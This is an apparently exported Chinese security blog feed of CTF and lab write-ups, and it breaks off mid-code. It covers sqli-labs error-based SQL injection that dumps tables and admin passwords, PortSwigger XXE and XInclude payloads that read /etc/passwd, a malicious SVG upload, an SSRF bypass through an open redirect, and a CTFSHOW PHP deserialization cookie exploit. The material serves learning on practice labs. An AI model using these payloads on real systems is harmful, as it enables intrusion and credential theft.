<p>1’ and (select count(*) from information_schema.tables where table_schema&#x3D;database() group by concat(0x7e,(select table_name from information_schema.tables where table_schema&#x3D;database() limit 1,1),0x7e,floor(rand(0)<em>2)))#    通过修改limit后面数字一个一个爆表<br>1’ and (select count(</em>) from information_schema.tables where table_schema&#x3D;database() group by concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),0x7e,floor(rand(0)*2)))#        爆出所有表</p>
</blockquote>
<blockquote>
<p>1’ and (select count(*) from information_schema.columns where table_schema&#x3D;database() group by concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’users’),0x7e,floor(rand(0)<em>2)))#    爆出所有字段名<br>1’ and (select count(</em>) from information_schema.columns group by concat(0x7e,(select group_concat(username,password) from users),0x7e,floor(rand(0)*2)))#    爆出所有字段名</p>
</blockquote>
<blockquote>
<p>1’ and (select 1 from(select count(*) from information_schema.columns where table_schema&#x3D;database() group by concat(0x7e,(select password from users where username&#x3D;’admin1’),0x7e,floor(rand(0)*2)))a)#    爆出该账户的密码。</p>
</blockquote>
]]></content>
      <categories>
        <category>sqli-labs</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>PortSwigger-XXE</title>
    <url>/2023/03/11/PortSwigger-XXE/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/>

<h2 id="什么是-XML-外部实体注入？"><a href="#什么是-XML-外部实体注入？" class="headerlink" title="什么是 XML 外部实体注入？"></a>什么是 XML 外部实体注入？</h2><p>XML 外部实体注入（也称为 XXE）是一种 Web 安全漏洞，允许攻击者干扰应用程序对 XML 数据的处理。它通常允许攻击者查看应用程序服务器文件系统上的文件，并与应用程序本身可以访问的任何后端或外部系统进行交互。</p>
<p>在某些情况下，攻击者可以利用 XXE 漏洞执行服务器端请求伪造(SSRF) 攻击，从而升级 XXE 攻击以破坏底层服务器或其他后端基础设施。</p>
<h2 id="XXE漏洞是如何产生的？"><a href="#XXE漏洞是如何产生的？" class="headerlink" title="XXE漏洞是如何产生的？"></a>XXE漏洞是如何产生的？</h2><p>一些应用程序使用 XML 格式在浏览器和服务器之间传输数据。执行此操作的应用程序实际上总是使用标准库或平台 API 来处理服务器上的 XML 数据。XXE 漏洞的出现是因为 XML 规范包含各种潜在危险的特性，而标准解析器支持这些特性，即使它们通常不被应用程序使用。<br>XML 外部实体是一种自定义 XML 实体，其定义的值是从声明它们的 DTD 外部加载的。从安全角度来看，外部实体特别有趣，因为它们允许根据文件路径或 URL 的内容定义实体。</p>
<h2 id="XML实体"><a href="#XML实体" class="headerlink" title="XML实体"></a>XML实体</h2><h3 id="什么是XML？"><a href="#什么是XML？" class="headerlink" title="什么是XML？"></a>什么是XML？</h3><p>XML 代表“可扩展标记语言”。XML 是一种设计用于存储和传输数据的语言。与 HTML 一样，XML 使用树状结构的标记和数据。与 HTML 不同，XML 不使用预定义的标签，因此可以为标签指定描述数据的名称。在网络历史的早期，XML 作为一种数据传输格式很流行（“AJAX”中的“X”代表“XML”）。但它的受欢迎程度现在已经下降，取而代之的是 JSON 格式。</p>
<h3 id="什么是-XML-实体？"><a href="#什么是-XML-实体？" class="headerlink" title="什么是 XML 实体？"></a>什么是 XML 实体？</h3><p>XML 实体是一种在 XML 文档中表示数据项的方式，而不是使用数据本身。XML 语言规范中内置了各种实体。例如，实体<code>&amp;lt;</code>和<code>&amp;gt;</code>表示字符&lt;和&gt;。这些是用于表示 XML 标记的元字符，因此当它们出现在数据中时，通常必须使用它们的实体来表示。</p>
<h3 id="什么是文档类型定义？"><a href="#什么是文档类型定义？" class="headerlink" title="什么是文档类型定义？"></a>什么是文档类型定义？</h3><p>XML 文档类型定义 (DTD) 包含可以定义 XML 文档的结构、它可以包含的数据值的类型以及其他项目的声明。DTD 在DOCTYPEXML 文档开头的可选元素中声明。DTD 可以完全独立于文档本身（称为“内部 DTD”），也可以从其他地方加载（称为“外部 DTD”），或者可以是两者的混合。</p>
<h3 id="什么是-XML-自定义实体？"><a href="#什么是-XML-自定义实体？" class="headerlink" title="什么是 XML 自定义实体？"></a>什么是 XML 自定义实体？</h3><p>XML 允许在 DTD 中定义自定义实体。例如：</p>
<blockquote>
<p><code>&lt;!DOCTYPE foo [ &lt;!ENTITY myentity &quot;my entity value&quot; &gt; ]&gt;</code><br>此定义意味着 XML 文档中对实体引用的任何使用都&amp;myentity;将替换为定义的值：“ my entity value”。</p>
</blockquote>
<h3 id="什么是-XML-外部实体？"><a href="#什么是-XML-外部实体？" class="headerlink" title="什么是 XML 外部实体？"></a>什么是 XML 外部实体？</h3><p>XML 外部实体是一种自定义实体，其定义位于声明它们的 DTD 之外。</p>
<p>外部实体的声明使用关键字SYSTEM，并且必须指定应从中加载实体值的 URL。例如：</p>
<blockquote>
<p><code>&lt;!DOCTYPE foo [ &lt;!ENTITY ext SYSTEM &quot;http://normal-website.com&quot; &gt; ]&gt;</code><br>URL 可以使用该file:&#x2F;&#x2F;协议，因此可以从文件加载外部实体。例如：</p>
</blockquote>
<blockquote>
<p><code>&lt;!DOCTYPE foo [ &lt;!ENTITY ext SYSTEM &quot;file:///path/to/file&quot; &gt; ]&gt;</code></p>
</blockquote>
<h2 id="利用XXE执行SSRF攻击"><a href="#利用XXE执行SSRF攻击" class="headerlink" title="利用XXE执行SSRF攻击"></a>利用XXE执行SSRF攻击</h2><p><img src="https://img-blog.csdnimg.cn/61f07784b7f245fd8f31186f0f1043f3.png" alt="1">进入网站在<strong>检查商店商店</strong>时，网站提交了POST请求，打开之后看到有XML<br><img src="https://img-blog.csdnimg.cn/6afd2b71181c40dca1a5c0ca2efe8f27.png" alt="1"><br>不妨构造XXE。</p>
<p><img src="https://img-blog.csdnimg.cn/3a23d819d8834ca6aee716adc370b6f6.png" alt="2"><br><img src="https://img-blog.csdnimg.cn/ea03a4027ab14aa79ec1121e48d6c6f0.png" alt="3"><br>跟着他说的依次访问，直到找到ACCESSkeyid<br><img src="https://img-blog.csdnimg.cn/9fc4a18f08df4f498ec23ab9850abc09.png" alt="5"></p>
<h2 id="Xinclude技术"><a href="#Xinclude技术" class="headerlink" title="Xinclude技术"></a>Xinclude技术</h2><p>XInclude 是一种支持将多个 XML 文档中的内容包含在单个 XML 文档中的技术。它是 XML 技术家族的一部分，旨在简化大型 XML 文档的创建和管理。</p>
<p>使用 XInclude，您可以创建一个“主”XML 文档，该文档将其他 XML 文档作为“子文档”引用。这些子文档可以按值或引用包含在内，生成的主控文档可以用作独立的 XML 文档。</p>
<p>XInclude 使用 XML 命名空间，其定义如下：</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">
xmlns:xi="http://www.w3.org/2001/XInclude"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>XInclude 支持两种类型的包含：按引用包含和按值包含。当您希望将外部文档作为 URI 包含时，将使用按引用包含，而当您希望包含外部文档的实际内容时，则使用按值包含。</p>
<p>下面是一个包含外部文档的 XInclude 语句示例，该语句使用按引用包含：</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">xi:</span>include</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>external.xml<span class="token punctuation">"</span></span> <span class="token attr-name">parse</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>xml<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>下面是一个包含外部文档的 XInclude 语句示例，该语句使用 include-by-value：</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">xi:</span>include</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>external.xml<span class="token punctuation">"</span></span> <span class="token attr-name">parse</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>XInclude 可以与任何 XML 文档一起使用，并且它受到 XML 解析器和编辑器的广泛支持。它能够简化大型 XML 文档的创建和管理，使其成为开发人员和内容创建者的宝贵工具。</p>
<p>一些应用程序接收客户端提交的数据，在服务器端将其嵌入到 XML 文档中，然后解析该文档。当客户端提交的数据被放入后端 SOAP 请求，然后由后端 SOAP 服务处理时，就会出现这种情况的一个示例。</p>
<p>在这种情况下，您无法执行经典的 XXE 攻击，因为您无法控制整个 XML 文档，因此无法定义或修改元素<code>DOCTYPE</code>。但是，您也许可以改用<code>XInclude</code>。<code>XInclude</code>是 XML 规范的一部分，它允许从子文档构建 XML 文档。您可以<code>XInclude</code>在 XML 文档中的任何数据值中进行攻击，因此可以在您仅控制放置在服务器端 XML 文档中的单个数据项的情况下执行攻击。</p>
<p>要执行<code>XInclude</code>攻击，您需要引用<code>XInclude</code>命名空间并提供您希望包含的文件的路径。例如：</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>foo</span> <span class="token attr-name"><span class="token namespace">xmlns:</span>xi</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.w3.org/2001/XInclude<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">xi:</span>include</span> <span class="token attr-name">parse</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file:///etc/passwd<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>foo</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<h2 id="通过文件上传进行-XXE-攻击"><a href="#通过文件上传进行-XXE-攻击" class="headerlink" title="通过文件上传进行 XXE 攻击"></a>通过文件上传进行 XXE 攻击</h2><p>一些应用程序允许用户上传文件，然后在服务器端进行处理。一些常见的文件格式使用 XML 或包含 XML 子组件。基于 XML 的格式的示例是办公文档格式（如 DOCX）和图像格式（如 SVG）。</p>
<p>例如，应用程序可能允许用户上传图像，并在上传后在服务器上处理或验证这些图像。即使应用程序希望接收 PNG 或 JPEG 等格式，正在使用的图像处理库也可能支持 SVG 图像。由于 SVG 格式使用 XML，攻击者可以提交恶意 SVG 图像，从而达到 XXE 漏洞的隐藏攻击面。</p>
<p><code>&lt;?xml version=&quot;1.0&quot; standalone=&quot;yes&quot;?&gt;&lt;!DOCTYPE test [ &lt;!ENTITY xxe SYSTEM &quot;file:///etc/hostname&quot; &gt; ]&gt;&lt;svg width=&quot;128px&quot; height=&quot;128px&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot; xmlns:xlink=&quot;http://www.w3.org/1999/xlink&quot; version=&quot;1.1&quot;&gt;&lt;text font-size=&quot;16&quot; x=&quot;0&quot; y=&quot;16&quot;&gt;&amp;xxe;&lt;/text&gt;&lt;/svg&gt;</code></p>
]]></content>
      <categories>
        <category>知识点</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>通过开放重定向绕过 SSRF 过滤器</title>
    <url>/2023/03/10/%E9%80%9A%E8%BF%87%E5%BC%80%E6%94%BE%E9%87%8D%E5%AE%9A%E5%90%91%E7%BB%95%E8%BF%87-SSRF-%E8%BF%87%E6%BB%A4%E5%99%A8/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/>

<h2 id="通过开放重定向绕过-SSRF-过滤器"><a href="#通过开放重定向绕过-SSRF-过滤器" class="headerlink" title="通过开放重定向绕过 SSRF 过滤器"></a>通过开放重定向绕过 SSRF 过滤器</h2><p>有时可以通过利用开放重定向漏洞来规避任何类型的基于过滤器的防御。</p>
<p>在前面的 SSRF 示例中，假设用户提交的 URL 被严格验证以防止恶意利用 SSRF 行为。但是，允许使用 URL 的应用程序存在开放重定向漏洞。如果用于发出后端 HTTP 请求的 API 支持重定向，您可以构建一个满足过滤器的 URL，并将请求重定向到所需的后端目标。</p>
<p>例如，假设应用程序包含一个开放重定向漏洞，其中包含以下 URL：</p>
<blockquote>
<p>&#x2F;product&#x2F;nextProduct?currentProductId&#x3D;6&amp;path&#x3D;<a href="http://evil-user.net/">http://evil-user.net</a></p>
<p>返回重定向到：</p>
</blockquote>
<blockquote>
<p><a href="http://evil-user.net/">http://evil-user.net</a></p>
<p>可以利用开放重定向漏洞绕过URL过滤，利用SSRF漏洞，方法如下：</p>
</blockquote>
<blockquote>
<p>POST &#x2F;product&#x2F;stock HTTP&#x2F;1.0<br>Content-Type: application&#x2F;x-www-form-urlencoded<br>Content-Length: 118</p>
<p>stockApi&#x3D;<a href="http://weliketoshop.net/product/nextProduct?currentProductId=6&amp;path=http://192.168.0.68/admin">http://weliketoshop.net/product/nextProduct?currentProductId=6&amp;path=http://192.168.0.68/admin</a></p>
</blockquote>
<p>此 SSRF 漏洞利用之所以有效，是因为应用程序首先验证提供的stockAPIURL 是否位于允许的域中，而事实确实如此。然后应用程序请求提供的 URL，这会触发打开重定向。它遵循重定向，并向攻击者选择的内部 URL 发出请求。</p>
<p><img src="https://img-blog.csdnimg.cn/b4f66ec9c7e141559dcda56eb0c4d290.png" alt="1"><br>随便点击一个商品查看，<br><img src="https://img-blog.csdnimg.cn/a3dfeecba0264eae985665d931c208dc.png" alt="2"><br>开启bp，抓包。<br><img src="https://img-blog.csdnimg.cn/f9443ac138fa44038a6e14964f76223f.png" alt="2"><br>url解码后得到<br><img src="https://img-blog.csdnimg.cn/b79f6f94ab294bfdba0e2ff7120e77dc.png" alt="3"><br>继续抓包，看下一个产品。<br><img src="https://img-blog.csdnimg.cn/ca3696e6f3df4d00b88f4ee58d5d8b3a.png" alt="2"><br>存在重定向，复制GET内容，放到stockapi里<br><img src="https://img-blog.csdnimg.cn/e3c347adb82a4416b369238ce4d8689c.png" alt="4"><br>改path，<br><img src="https://img-blog.csdnimg.cn/19fc3e9644984ea49b28a1ec8cb0233c.png" alt="5"><br>成功删除！！<br><img src="https://img-blog.csdnimg.cn/b151769e345a447eaa8b0fc724cd368e.png" alt="6"></p>
]]></content>
      <categories>
        <category>知识点</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>记一次博客网页图片在部署后无法显示的问题</title>
    <url>/2023/03/09/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%8D%9A%E5%AE%A2%E7%BD%91%E9%A1%B5%E5%9B%BE%E7%89%87%E5%9C%A8%E9%83%A8%E7%BD%B2%E5%90%8E%E6%97%A0%E6%B3%95%E6%98%BE%E7%A4%BA%E7%9A%84%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/>

<h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p>我平常写博客就是先在csdn上完成后再复制粘贴到hexo博客中，这样容易引入图片，今天遇到一个问题就是在部署后发现hexo博客无法显示图片了。</p>
<h2 id="解决问题"><a href="#解决问题" class="headerlink" title="解决问题"></a>解决问题</h2><p>方法其实很简单，只需要文章的头部如下图所示位置添加这一句话就可以完美解决问题</p>
<p><img src="https://img-blog.csdnimg.cn/5616d0a30e614287881b0ae1a13cb8ff.png" alt="2"></p>
]]></content>
      <categories>
        <category>博客</category>
      </categories>
  </entry>
  <entry>
    <title>CTFSHOW-反序列化</title>
    <url>/2023/03/08/CTFSHOW-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/>

<h2 id="web255"><a href="#web255" class="headerlink" title="web255"></a>web255</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token comment">/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-12-02 17:44:47
# @Last Modified by:   h1xa
# @Last Modified time: 2020-12-02 19:29:02
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/</span>

<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">ctfShowUser</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token operator">=</span><span class="token string single-quoted-string">'xxxxxx'</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token operator">=</span><span class="token string single-quoted-string">'xxxxxx'</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$isVip</span><span class="token operator">=</span><span class="token constant boolean">false</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">checkVip</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">isVip</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">login</span><span class="token punctuation">(</span><span class="token variable">$u</span><span class="token punctuation">,</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token operator">===</span><span class="token variable">$u</span><span class="token operator">&amp;&amp;</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token operator">===</span><span class="token variable">$p</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">vipOneKeyGetFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">isVip</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">global</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>
            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"your flag is "</span><span class="token operator">.</span><span class="token variable">$flag</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"no vip, no flag"</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token variable">$username</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$password</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token operator">-></span><span class="token function">login</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token operator">-></span><span class="token function">checkVip</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token variable">$user</span><span class="token operator">-></span><span class="token function">vipOneKeyGetFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"no vip,no flag"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>首先定义一个类<strong>ctfShowUser</strong>，创建公共变量<code>$username，$password，$isVip</code>。</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token operator">-></span><span class="token function">login</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token operator">-></span><span class="token function">checkVip</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token variable">$user</span><span class="token operator">-></span><span class="token function">vipOneKeyGetFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"no vip,no flag"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>将cookie反序列化，cookie用user传入。总体思路也就是GET传入username和password然后将cookie进行反序列化。由于<code>public $isVip=false;public function checkVip()&#123;        return $this-&gt;isVip;    &#125;</code>，所以要将checkvip回显为真。并且获得将cookie的user序列化后的代码。</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">ctfShowUser</span><span class="token punctuation">&#123;</span>
	<span class="token keyword">public</span> <span class="token variable">$isVip</span><span class="token operator">=</span><span class="token constant boolean">true</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ctfShowUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>执行结果为<code>O%3A11%3A%22ctfShowUser%22%3A1%3A%7Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D</code><br><img src="https://img-blog.csdnimg.cn/232c87cffaf54618987f47609eea9756.png" alt="1"><br><img src="https://img-blog.csdnimg.cn/8ad56eb636804a2d8bb55c4f918fe918.png" alt="2">得到flag。</p>
<h2 id="web256"><a href="#web256" class="headerlink" title="web256"></a>web256</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token comment">/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-12-02 17:44:47
# @Last Modified by:   h1xa
# @Last Modified time: 2020-12-02 19:29:02
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/</span>

<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">ctfShowUser</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token operator">=</span><span class="token string single-quoted-string">'xxxxxx'</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token operator">=</span><span class="token string single-quoted-string">'xxxxxx'</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$isVip</span><span class="token operator">=</span><span class="token constant boolean">false</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">checkVip</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">isVip</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">login</span><span class="token punctuation">(</span><span class="token variable">$u</span><span class="token punctuation">,</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token operator">===</span><span class="token variable">$u</span><span class="token operator">&amp;&amp;</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token operator">===</span><span class="token variable">$p</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">vipOneKeyGetFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">isVip</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">global</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token operator">!==</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
                    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"your flag is "</span><span class="token operator">.</span><span class="token variable">$flag</span><span class="token punctuation">;</span>
              <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"no vip, no flag"</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token variable">$username</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
